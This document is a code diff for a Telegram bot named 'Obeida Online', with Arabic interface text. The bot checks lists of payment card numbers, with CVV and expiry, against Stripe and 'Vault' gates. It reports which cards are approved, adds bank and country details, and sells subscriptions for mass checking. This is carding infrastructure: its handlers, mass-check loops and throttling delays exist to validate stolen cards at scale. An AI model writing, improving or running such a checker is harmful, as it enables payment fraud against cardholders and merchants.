                 InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
                 InlineKeyboardButton("📢 القناة", url=CHANNEL_LINK),
@@ -1377,13 +977,6 @@ class CommandHandler:
             "content": content,
             "timestamp": datetime.now().isoformat()
         }
-        for uid in list(self.user_last_file.keys()):
-            try:
-                ts = datetime.fromisoformat(self.user_last_file[uid]["timestamp"])
-                if (datetime.now() - ts).seconds > 3600:
-                    del self.user_last_file[uid]
-            except:
-                pass
     
     def get_last_file(self, user_id: int) -> Optional[Dict]:
         return self.user_last_file.get(user_id)
@@ -1404,55 +997,33 @@ class CommandHandler:
                 "joined_date": datetime.now().isoformat(),
                 "is_admin": user.id in ADMIN_IDS,
                 "usage": {"total_checks": 0, "approved": 0, "declined": 0},
-                "default_gate": "stripe1"
+                "default_gate": "stripe"
             }
             DataManager.save_users(users)
         
         default_gate = DataManager.get_user_default_gate(user.id)
-        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe v1")
+        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
         
         settings = DataManager.load_settings()
         current_delay = settings.get("delay_between_cards", 5)
         
-        if chat_type == "private":
-            welcome = f"""
+        welcome = f"""
 ✨ <b>مرحباً بك في بوت Obeida Online</b> ✨
 
 <b>🚪 البوابة الافتراضية:</b> {default_gate_name}
 <b>⏱️ المدة بين البطاقات:</b> {current_delay} ثانية
-<b>💡 يمكنك إرسال البطاقة مباشرة وسيتم فحصها تلقائياً!</b>
 
 <b>📝 البوابات المتاحة:</b>
-💳 Stripe v1 - فحص عبر Stripe
-💎 Stripe v2 - فحص بديل
-🔥 Real Check - فحص حقيقي متقدم
+💳 Stripe - فحص عبر Stripe
+⚡ Vault - فحص متطور
 
 <b>📝 الأوامر:</b>
-/st1 - فحص بطاقة عبر Stripe v1
-/st2 - فحص بطاقة عبر Stripe v2
-/chk - فحص بطاقة عبر النظام المتقدم
-/st1m - فحص ملف عبر Stripe v1
-/st2m - فحص ملف عبر Stripe v2
-/chkm - فحص ملف عبر النظام المتقدم
+/st - فحص بطاقة عبر Stripe
+/chk - فحص بطاقة عبر Vault
+/mass - فحص ملف عبر Stripe
+/chkm - فحص ملف عبر Vault
 /stop - إيقاف الفحص الحالي
-/delay - عرض أو تغيير المدة بين البطاقات
-
-<b>📢 القناة:</b> {CHANNEL_USERNAME}
-<b>👨‍💻 المطور:</b> {DEV_CONTACT}
-"""
-        else:
-            welcome = f"""
-✨ <b>مرحباً بك في بوت Obeida Online</b> ✨
-
-<b>🚪 البوابة الافتراضية:</b> {default_gate_name}
-<b>⏱️ المدة بين البطاقات:</b> {current_delay} ثانية
-
-<b>📝 كيفية الاستخدام في المجموعة:</b>
-• أرسل البطاقة مع منشن البوت: <code>@{BOT_USERNAME} 4111111111111111|12|25|123</code>
-• أرسل ملف txt مع منشن البوت
-• استخدم /st1@ObeidaOnlineBot أو /st2@ObeidaOnlineBot أو /chk@ObeidaOnlineBot
-• /stop@ObeidaOnlineBot - إيقاف الفحص الحالي
-• /delay@ObeidaOnlineBot - عرض المدة الحالية
+/delay - عرض أو تغيير المدة
 
 <b>📢 القناة:</b> {CHANNEL_USERNAME}
 <b>👨‍💻 المطور:</b> {DEV_CONTACT}
@@ -1465,13 +1036,9 @@ class CommandHandler:
         user_id = message.from_user.id
         
         if self.mass_manager.stop_check(user_id):
-            bot.reply_to(message, "⛔ <b>تم إيقاف الفحص بنجاح</b>\n\nيمكنك بدء فحص جديد في أي وقت.", parse_mode='HTML')
+            bot.reply_to(message, "⛔ <b>تم إيقاف الفحص بنجاح</b>", parse_mode='HTML')
         else:
-            check = self.mass_manager.get_check(user_id)
-            if check:
-                bot.reply_to(message, "⚠️ <b>لا يمكن إيقاف الفحص حالياً</b>\n\nيرجى المحاولة مرة أخرى.", parse_mode='HTML')
-            else:
-                bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط حالياً</b>\n\nاستخدم /st1m أو /st2m أو /chkm لبدء فحص جديد.", parse_mode='HTML')
+            bot.reply_to(message, "ℹ️ <b>لا يوجد فحص نشط حالياً</b>", parse_mode='HTML')
     
     def handle_delay(self, message):
         if not self.check_sub(message):
@@ -1481,19 +1048,19 @@ class CommandHandler:
             parts = message.text.strip().split()
             if len(parts) < 2:
                 current_delay = DataManager.load_settings().get("delay_between_cards", 5)
-                bot.reply_to(message, f"⏱️ <b>المدة الحالية بين البطاقات:</b> {current_delay} ثانية\n\nللتغيير استخدم: <code>/delay 5</code>\n(المدة من 1 إلى 30 ثانية)", parse_mode='HTML')
+                bot.reply_to(message, f"⏱️ <b>المدة الحالية:</b> {current_delay} ثانية\n\nللتغيير: <code>/delay 5</code>", parse_mode='HTML')
                 return
             
             delay = int(parts[1])
             if delay < 1 or delay > 30:
-                bot.reply_to(message, "⚠️ المدة يجب أن تكون بين 1 و 30 ثانية", parse_mode='HTML')
+                bot.reply_to(message, "⚠️ المدة بين 1 و 30 ثانية", parse_mode='HTML')
                 return
             
             settings = DataManager.load_settings()
             settings["delay_between_cards"] = delay
             DataManager.save_settings(settings)
             
-            bot.reply_to(message, f"✅ <b>تم تغيير المدة إلى {delay} ثانية</b>\n\nسيتم تطبيق المدة الجديدة في الفحوصات القادمة.", parse_mode='HTML')
+            bot.reply_to(message, f"✅ <b>تم تغيير المدة إلى {delay} ثانية</b>", parse_mode='HTML')
             
         except Exception as e:
             bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}", parse_mode='HTML')
@@ -1504,8 +1071,8 @@ class CommandHandler:
         data = users.get(str(user_id), {})
         usage = data.get('usage', {})
         sub = data.get('subscription', {})
-        default_gate = data.get('default_gate', 'stripe1')
-        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe v1")
+        default_gate = data.get('default_gate', 'stripe')
+        default_gate_name = GATES.get(default_gate, {}).get("name", "Stripe")
         expiry = sub.get('expiry', 'لا يوجد')[:10] if sub.get('expiry') else 'لا يوجد'
         total = usage.get('total_checks', 0)
         approved = usage.get('approved', 0)
@@ -1515,10 +1082,8 @@ class CommandHandler:
 👤 <b>الملف الشخصي</b>
 ━━━━━━━━━━━━
 <b>🆔 المعرف:</b> <code>{user_id}</code>
-<b>👤 الاسم:</b> {data.get('first_name', 'Unknown')}
 <b>⭐ الرتبة:</b> {'👑 مشرف' if user_id in ADMIN_IDS else '💎 مشترك' if sub.get('active') else '🔹 عادي'}
 <b>🚪 البوابة الافتراضية:</b> {default_gate_name}
-<b>📅 الانضمام:</b> {data.get('joined_date', 'Unknown')[:10]}
 
 <b>📊 الإحصائيات:</b>
 • إجمالي: {total}
@@ -1528,7 +1093,7 @@ class CommandHandler:
 
 <b>💎 الاشتراك:</b> {sub.get('plan', 'لا يوجد')} | ينتهي: {expiry}
 ━━━━━━━━━━━━
-<b>🆔 Obeida Online</b>
+🆔 Obeida Online
 """
         bot.reply_to(message, profile, parse_mode='HTML', reply_markup=self.ui.back_button())
     
@@ -1538,25 +1103,16 @@ class CommandHandler:
         daily = stats.get("daily_stats", {}).get(today, {"checks": 0, "approved": 0})
         total = stats.get('total_checks', 0)
         approved = stats.get('total_approved', 0)
-        declined = stats.get('total_declined', 0)
-        
-        gates_usage = stats.get('gates_usage', {})
-        gates_text = "\n".join([f"  {GATES.get(g, {}).get('icon', '🚪')} {g}: {c}" for g, c in gates_usage.items()][:5])
         
         text = f"""
 📊 <b>إحصائيات البوت</b>
 ━━━━━━━━━━━━
 📅 <b>اليوم:</b> {daily['checks']} فحص | ✅ {daily['approved']}
-━━━━━━━━━━━━
 📈 <b>الإجمالي:</b> {total} فحص
 ✅ المقبولة: {approved}
-❌ المرفوضة: {declined}
 📊 نسبة النجاح: {(approved/total*100) if total > 0 else 0:.1f}%
 ━━━━━━━━━━━━
-🚪 <b>استخدام البوابات:</b>
-{gates_text if gates_text else '  لا توجد بيانات'}
-━━━━━━━━━━━━
-<b>🆔 Obeida Online</b>
+🆔 Obeida Online
 """
         bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
     
@@ -1568,7 +1124,7 @@ class CommandHandler:
                 remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
                 text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
             else:
-                text = "💎 لديك اشتراك دائم (Lifetime)"
+                text = "💎 لديك اشتراك دائم"
             bot.reply_to(message, text, parse_mode='HTML')
         else:
             plans = "\n".join([f"• {p['name']}: {p['price']}" for p in SUBSCRIPTION_PLANS.values()])
@@ -1577,7 +1133,7 @@ class CommandHandler:
 ━━━━━━━━━━━━
 {plans}
 ━━━━━━━━━━━━
-<b>للاشتراك تواصل مع المطور:</b> {DEV_CONTACT}
+<b>للاشتراك:</b> {DEV_CONTACT}
 """
             bot.reply_to(message, text, parse_mode='HTML', reply_markup=self.ui.back_button())
     
@@ -1590,20 +1146,16 @@ class CommandHandler:
     def handle_set_default_gate(self, call, gate_id):
         if DataManager.set_user_default_gate(call.from_user.id, gate_id):
             gate_name = GATES[gate_id]['name']
-            bot.answer_callback_query(call.id, f"✅ تم تعيين {gate_name} كبوابة افتراضية")
-            bot.edit_message_text(f"✅ تم تعيين {gate_name} كبوابة افتراضية\n\nالآن أي بطاقة ترسلها سيتم فحصها بهذه البوابة",
+            bot.answer_callback_query(call.id, f"✅ تم تعيين {gate_name}")
+            bot.edit_message_text(f"✅ تم تعيين {gate_name} كبوابة افتراضية",
                                  call.message.chat.id, call.message.message_id,
                                  reply_markup=self.ui.back_button())
-        else:
-            bot.answer_callback_query(call.id, "❌ فشل في تعيين البوابة")
     
     def check_single_card(self, message, card: Dict, gate: str):
-        """فحص بطاقة واحدة"""
         user_id = message.from_user.id
         gate_name = GATES[gate]['name']
         masked_card = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
         
-        # إرسال رسالة البداية
         progress_msg = bot.reply_to(
             message,
             f"""
@@ -1623,38 +1175,22 @@ class CommandHandler:
         stop_animation = threading.Event()
         
         def animate_circles():
-            frames = [
-                [0, 0, 0],
-                [1, 0, 0],
-                [1, 1, 0],
-                [1, 1, 1],
-                [0, 0, 0],
-            ]
-            
+            frames = ["◯ ◯ ◯", "● ◯ ◯", "● ● ◯", "● ● ●", "◯ ◯ ◯"]
             frame_index = 0
             while not stop_animation.is_set():
                 try:
-                    circles = frames[frame_index % len(frames)]
-                    circle_display = ""
-                    for c in circles:
-                        if c == 0:
-                            circle_display += "◯ "
-                        else:
-                            circle_display += "● "
-                    circle_display = circle_display.strip()
-                    
                     text = f"""
 🚀  جاري الفحص 🚀
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 
 𒊹︎︎︎ 𝗕𝗔𝗧𝗔𝗤𝗔𝗛 ⌁ {masked_card}
-𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق {circle_display}
+𒊹︎︎︎ 𝗦𝗧𝗔𝗧𝗨𝗦 ⌁ جاري التحقق {frames[frame_index % len(frames)]}
 ⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
 """
                     bot.edit_message_text(text, chat_id, message_id, parse_mode='HTML')
                     frame_index += 1
                     time.sleep(0.4)
-                except Exception as e:
+                except:
                     break
         
         animation_thread = threading.Thread(target=animate_circles)
@@ -1663,14 +1199,14 @@ class CommandHandler:
         try:
             loop = asyncio.new_event_loop()
             asyncio.set_event_loop(loop)
-            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card, user_id))
+            approved, resp = loop.run_until_complete(self.gateways.check_card(gate, card))
             loop.close()
             
             stop_animation.set()
             animation_thread.join(timeout=1)
             
-            DataManager.update_usage(message.from_user.id, gate, resp)
-            DataManager.save_card_result(card['original'], gate_name, resp, message.from_user.id, approved)
+            DataManager.update_usage(user_id, gate, resp)
+            DataManager.save_card_result(card['original'], gate_name, resp, user_id, approved)
             
             bin_info = Helpers.get_bin_info(card['number'][:6])
             final_result = ResultFormatter.format_single_result(card['original'], resp, approved, gate_name, bin_info)
@@ -1687,7 +1223,7 @@ class CommandHandler:
         chat_id = message.chat.id
         
         if self.mass_manager.is_checking(user_id):
-            bot.reply_to(message, "⚠️ <b>لديك فحص نشط حالياً!</b>\n\nاستخدم /stop لإيقاف الفحص الحالي أولاً.", parse_mode='HTML')
+            bot.reply_to(message, "⚠️ <b>لديك فحص نشط حالياً!</b>\nاستخدم /stop للإيقاف", parse_mode='HTML')
             return
         
         settings = DataManager.load_settings()
@@ -1700,15 +1236,11 @@ class CommandHandler:
 ━━━━━━━━━━━━
 📊 <b>إجمالي البطاقات:</b> {len(cards)}
 🚪 <b>البوابة:</b> {GATES[gate]['icon']} {GATES[gate]['name']}
-⏱️ <b>المدة بين البطاقات:</b> {delay_seconds} ثانية
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
+⏱️ <b>المدة:</b> {delay_seconds} ثانية
+━━━━━━━━━━━━
 ✅ <b>المقبولة:</b> 0
 ❌ <b>المرفوضة:</b> 0
-🔄 <b>الحالة:</b> جاري الفحص...
-━━━━━━━━━━━━
-💡 استخدم /stop لإيقاف الفحص
-💡 استخدم /delay لتغيير المدة
+💡 استخدم /stop للإيقاف
 """, parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
         
         check = self.mass_manager.get_check(user_id)
@@ -1724,9 +1256,7 @@ class CommandHandler:
             loop.run_until_complete(self._process_mass_check(user_id))
             loop.close()
         except Exception as e:
-            print(f"Error in mass check: {e}")
-        finally:
-            self.gateways.cleanup_user(user_id)
+            print(f"Error: {e}")
     
     async def _process_mass_check(self, user_id: int):
         check = self.mass_manager.get_check(user_id)
@@ -1745,30 +1275,6 @@ class CommandHandler:
         all_results = []
         message_id = check['message_id']
         
-        await asyncio.get_event_loop().run_in_executor(
-            None,
-            lambda: bot.edit_message_text(
-                f"""
-🚀 <b>جاري الفحص المتسلسل</b> 🚀
-━━━━━━━━━━━━
-📊 <b>إجمالي البطاقات:</b> {total_cards}
-🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
-⏱️ <b>المدة بين البطاقات:</b> {delay_seconds} ثانية
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
-✅ <b>المقبولة:</b> 0
-❌ <b>المرفوضة:</b> 0
-🔄 <b>الحالة:</b> جاري الفحص...
-━━━━━━━━━━━━
-💡 استخدم /stop لإيقاف الفحص
-""",
-                chat_id,
-                message_id,
-                parse_mode='HTML',
-                reply_markup=self.ui.stop_button(int(time.time() * 1000))
-            )
-        )
-        
         for i, card in enumerate(cards, 1):
             check = self.mass_manager.get_check(user_id)
             if not check or check.get('stop'):
@@ -1782,151 +1288,69 @@ class CommandHandler:
 ━━━━━━━━━━━━
 📊 <b>إجمالي البطاقات:</b> {total_cards}
 🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
-⏱️ <b>المدة بين البطاقات:</b> {delay_seconds} ثانية
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
+━━━━━━━━━━━━
 ✅ <b>المقبولة:</b> {check['approved']}
 ❌ <b>المرفوضة:</b> {check['declined']}
 🔄 <b>جاري فحص:</b> <code>{current_card}</code> ({i}/{total_cards})
 ━━━━━━━━━━━━
-💡 استخدم /stop لإيقاف الفحص
+💡 استخدم /stop للإيقاف
 """
                 
                 await asyncio.get_event_loop().run_in_executor(
                     None,
-                    lambda: bot.edit_message_text(
-                        progress_text,
-                        chat_id,
-                        message_id,
-                        parse_mode='HTML',
-                        reply_markup=self.ui.stop_button(int(time.time() * 1000))
-                    )
+                    lambda: bot.edit_message_text(progress_text, chat_id, message_id, parse_mode='HTML')
                 )
                 
-                approved, resp = await self.gateways.check_card(gate, card, user_id)
+                approved, resp = await self.gateways.check_card(gate, card)
                 
                 check = self.mass_manager.get_check(user_id)
                 if not check:
                     break
                 
                 check['checked'] += 1
-                
                 card_result = ResultFormatter.format_card_result(card['original'], resp, approved)
                 all_results.append(card_result)
                 
                 if approved:
                     check['approved'] += 1
-                    
-                    number = card['number']
-                    masked = f"{number[:6]}xxxxxx{number[-4:]}"
-                    bin_info = Helpers.get_bin_info(number[:6])
+                    bin_info = Helpers.get_bin_info(card['number'][:6])
                     
                     approved_msg = f"""
 ✅ <b>بطاقة مقبولة</b>
 ━━━━━━━━━━━━
 <b>💳 البطاقة:</b> <code>{card['original']}</code>
-<b>🔢 الرقم المخفي:</b> <code>{masked}</code>
 <b>🏷️ النوع:</b> {bin_info.get('brand', 'Unknown')}
 <b>🏦 البنك:</b> {bin_info.get('bank', 'Unknown')}
 <b>🌍 الدولة:</b> {bin_info.get('country', 'Unknown')} {bin_info.get('flag', '🏁')}
-<b>🚪 البوابة:</b> {gate_name}
 <b>📊 الحالة:</b> {resp}
-━━━━━━━━━━━━
-🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 """
-                    
                     await asyncio.get_event_loop().run_in_executor(
-                        None,
-                        lambda: bot.send_message(chat_id, approved_msg, parse_mode='HTML')
+                        None, lambda: bot.send_message(chat_id, approved_msg, parse_mode='HTML')
                     )
-                    
                     DataManager.save_card_result(card['original'], gate_name, resp, user_id, True)
-                    
                 else:
                     check['declined'] += 1
                     DataManager.save_card_result(card['original'], gate_name, resp, user_id, False)
                 
                 DataManager.update_usage(user_id, gate, resp)
-                
-                after_progress = f"""
-🚀 <b>جاري الفحص المتسلسل</b> 🚀
-━━━━━━━━━━━━
-📊 <b>إجمالي البطاقات:</b> {total_cards}
-🚪 <b>البوابة:</b> {GATES[gate]['icon']} {gate_name}
-⏱️ <b>المدة بين البطاقات:</b> {delay_seconds} ثانية
-⏤‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌
-
-✅ <b>المقبولة:</b> {check['approved']}
-❌ <b>المرفوضة:</b> {check['declined']}
-🔄 <b>تم فحص:</b> {check['checked']}/{total_cards}
-━━━━━━━━━━━━
-💡 استخدم /stop لإيقاف الفحص
-"""
-                
-                await asyncio.get_event_loop().run_in_executor(
-                    None,
-                    lambda: bot.edit_message_text(
-                        after_progress,
-                        chat_id,
-                        message_id,
-                        parse_mode='HTML',
-                        reply_markup=self.ui.stop_button(int(time.time() * 1000))
-                    )
-                )
-                
                 await asyncio.sleep(delay_seconds)
                 
             except Exception as e:
                 print(f"Error: {e}")
-                check = self.mass_manager.get_check(user_id)
                 if check:
                     check['checked'] += 1
                     check['declined'] += 1
-                    card_result = ResultFormatter.format_card_result(card['original'], f"⚠️ خطأ: {str(e)[:30]}", False)
-                    all_results.append(card_result)
         
         check = self.mass_manager.get_check(user_id)
         if check and not check.get('stop'):
             results_text = ResultFormatter.format_mass_result_header(total_cards, gate_name)
             results_text += "\n".join(all_results[:50])
-            if len(all_results) > 50:
-                results_text += f"\n\n... و {len(all_results) - 50} نتيجة أخرى"
             results_text += ResultFormatter.format_mass_result_footer(
-                check['approved'], check['declined'], total_cards, 0
+                check['approved'], check['declined'], total_cards
             )
             
-            try:
-                await asyncio.get_event_loop().run_in_executor(
-                    None,
-                    lambda: bot.edit_message_text(
-                        results_text,
-                        chat_id,
-                        message_id,
-                        parse_mode='HTML'
-                    )
-                )
-            except Exception as e:
-                print(f"Error editing final message: {e}")
-                await asyncio.get_event_loop().run_in_executor(
-                    None,
-                    lambda: bot.send_message(chat_id, results_text, parse_mode='HTML')
-                )
-            
-            summary = f"""
-✅ <b>اكتمل الفحص</b>
-━━━━━━━━━━━━
-📊 إجمالي البطاقات: {total_cards}
-✅ المقبولة: {check['approved']}
-❌ المرفوضة: {check['declined']}
-📈 نسبة النجاح: {(check['approved']/total_cards*100) if total_cards > 0 else 0:.1f}%
-━━━━━━━━━━━━
-{'📌 تم إرسال البطاقات المقبولة فوراً' if check['approved'] > 0 else '❌ لا توجد بطاقات مقبولة'}
-📁 تم حفظ النتائج في الملفات
-"""
-            
             await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: bot.send_message(chat_id, summary, parse_mode='HTML')
+                None, lambda: bot.edit_message_text(results_text, chat_id, message_id, parse_mode='HTML')
             )
         
         self.mass_manager.remove_check(user_id)
@@ -1936,11 +1360,8 @@ class CommandHandler:
             return
         
         parts = message.text.strip().split(' ', 1)
-        if len(parts) > 0 and '@' in parts[0]:
-            parts[0] = parts[0].split('@')[0]
-        
         if len(parts) < 2:
-            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv\nمثال: /{GATES[gate]['command']} 4111111111111111|12|25|123")
+            bot.reply_to(message, f"⚠️ الاستخدام: /{GATES[gate]['command']} رقم|شهر|سنة|cvv")
             return
         
         card = Helpers.parse_card(parts[1])
@@ -1949,7 +1370,7 @@ class CommandHandler:
             return
         
         if not Helpers.luhn_check(card['number']):
-            bot.reply_to(message, "❌ البطاقة غير صالحة (Luhn check failed)")
+            bot.reply_to(message, "❌ البطاقة غير صالحة")
             return
         
         self.check_single_card(message, card, gate)
@@ -1965,10 +1386,10 @@ class CommandHandler:
             if last_file:
                 cards = Helpers.extract_cards_from_text(last_file["content"])
                 if cards:
-                    bot.reply_to(message, f"📁 استخدام آخر ملف: {last_file['file_name']}\n📊 عدد البطاقات: {len(cards)}")
+                    bot.reply_to(message, f"📁 استخدام آخر ملف: {last_file['file_name']}\n📊 {len(cards)} بطاقة")
                     self.check_multiple_cards(message, cards, gate)
                 else:
-                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف المحفوظ")
+                    bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
             else:
                 bot.reply_to(message, f"📁 أرسل ملف txt بالبطاقات\nاستخدم: /{GATES[gate]['mass_command']}")
     
@@ -1991,31 +1412,28 @@ class CommandHandler:
             if gate is None:
                 gate = DataManager.get_user_default_gate(message.from_user.id)
             
-            bot.reply_to(message, f"📁 تم استلام الملف: {message.document.file_name}\n📊 عدد البطاقات: {len(cards)}\n🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}\n🔄 جاري بدء الفحص...")
-            
+            bot.reply_to(message, f"📁 {message.document.file_name}\n📊 {len(cards)} بطاقة\n🚪 {GATES[gate]['icon']} {GATES[gate]['name']}")
             self.check_multiple_cards(message, cards, gate)
             
         except Exception as e:
-            bot.reply_to(message, f"⚠️ خطأ في قراءة الملف: {str(e)[:50]}")
+            bot.reply_to(message, f"⚠️ خطأ: {str(e)[:50]}")
     
     def check_last_file(self, message):
         user_id = message.from_user.id
         last_file = self.get_last_file(user_id)
         
         if not last_file:
-            bot.reply_to(message, "❌ لم تقم بإرسال أي ملف من قبل\nأرسل ملف txt أولاً ثم استخدم هذا الأمر")
+            bot.reply_to(message, "❌ لم تقم بإرسال أي ملف من قبل")
             return
         
         cards = Helpers.extract_cards_from_text(last_file["content"])
         
         if not cards:
-            bot.reply_to(message, "❌ لا توجد بطاقات صالحة في الملف المحفوظ")
+            bot.reply_to(message, "❌ لا توجد بطاقات صالحة")
             return
         
         gate = DataManager.get_user_default_gate(user_id)
-        
-        bot.reply_to(message, f"📁 جاري فحص آخر ملف: {last_file['file_name']}\n📊 عدد البطاقات: {len(cards)}\n🚪 البوابة: {GATES[gate]['icon']} {GATES[gate]['name']}")
-        
+        bot.reply_to(message, f"📁 {last_file['file_name']}\n📊 {len(cards)} بطاقة")
         self.check_multiple_cards(message, cards, gate)
     
     def handle_add_sub(self, message):
@@ -2025,30 +1443,17 @@ class CommandHandler:
         try:
             parts = message.text.strip().split()
             if len(parts) < 2:
-                bot.reply_to(message, "❌ الصيغة: /addsub [ايدي المستخدم] [المدة بالأيام]\nمثال: /addsub 123456789 30")
+                bot.reply_to(message, "❌ /addsub [ايدي] [المدة]")
                 return
             
             user_id = int(parts[1])
             days = int(parts[2]) if len(parts) > 2 else 30
             
             if DataManager.add_subscription(user_id, days):
-                try:
-                    bot.send_message(user_id, f"🎉 تم تفعيل اشتراكك لمدة {days} يوم بنجاح!\nاستمتع بفحص البطاقات.")
-                except:
-                    pass
-                
-                bot.reply_to(message, f"""
-✅ <b>تم إضافة الاشتراك بنجاح</b>
-━━━━━━━━━━━━
-👤 <b>المستخدم:</b> <code>{user_id}</code>
-📅 <b>المدة:</b> {days} يوم
-📆 <b>ينتهي:</b> {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}
-━━━━━━━━━━━━
-تم إشعار المستخدم.
-""", parse_mode='HTML')
+                bot.send_message(user_id, f"🎉 تم تفعيل اشتراكك لمدة {days} يوم")
+                bot.reply_to(message, f"✅ تم إضافة اشتراك {days} يوم للمستخدم {user_id}")
             else:
-                bot.reply_to(message, "❌ فشل في إضافة الاشتراك")
-                
+                bot.reply_to(message, "❌ فشل")
         except Exception as e:
             bot.reply_to(message, f"❌ خطأ: {e}")
     
@@ -2059,21 +1464,15 @@ class CommandHandler:
         try:
             parts = message.text.strip().split()
             if len(parts) < 2:
-                bot.reply_to(message, "❌ الصيغة: /removesub [ايدي المستخدم]")
+                bot.reply_to(message, "❌ /removesub [ايدي]")
                 return
             
             user_id = int(parts[1])
             
             if DataManager.remove_subscription(user_id):
-                try:
-                    bot.send_message(user_id, "⚠️ تم إلغاء اشتراكك. للاشتراك مرة أخرى تواصل مع المطور.")
-                except:
-                    pass
-                
-                bot.reply_to(message, f"✅ تم إزالة اشتراك المستخدم <code>{user_id}</code>", parse_mode='HTML')
+                bot.reply_to(message, f"✅ تم إزالة اشتراك المستخدم {user_id}")
             else:
-                bot.reply_to(message, "❌ فشل في إزالة الاشتراك")
-                
+                bot.reply_to(message, "❌ فشل")
         except Exception as e:
             bot.reply_to(message, f"❌ خطأ: {e}")
 
@@ -2084,7 +1483,6 @@ class CallbackHandler:
     
     def handle(self, call):
         data = call.data
-        uid = call.from_user.id
         
         if data == "back_main":
             chat_type = Helpers.get_chat_type(call.message.chat.id)
@@ -2098,21 +1496,7 @@ class CallbackHandler:
             self.handler.handle_stats(call.message)
         
         elif data == "subscribe":
-            sub = DataManager.get_user_subscription(uid)
-            if sub:
-                expiry_date = sub.get('expiry', '')
-                if expiry_date and expiry_date != "2099-12-31":
-                    remaining = (datetime.fromisoformat(expiry_date) - datetime.now()).days
-                    text = f"💎 اشتراكك نشط\n📅 ينتهي: {expiry_date[:10]}\n⏰ متبقي: {remaining} يوم"
-                else:
-                    text = "💎 لديك اشتراك دائم (Lifetime)"
-                bot.edit_message_text(text, call.message.chat.id, call.message.message_id,
-                                     reply_markup=UserInterface.back_button())
-            else:
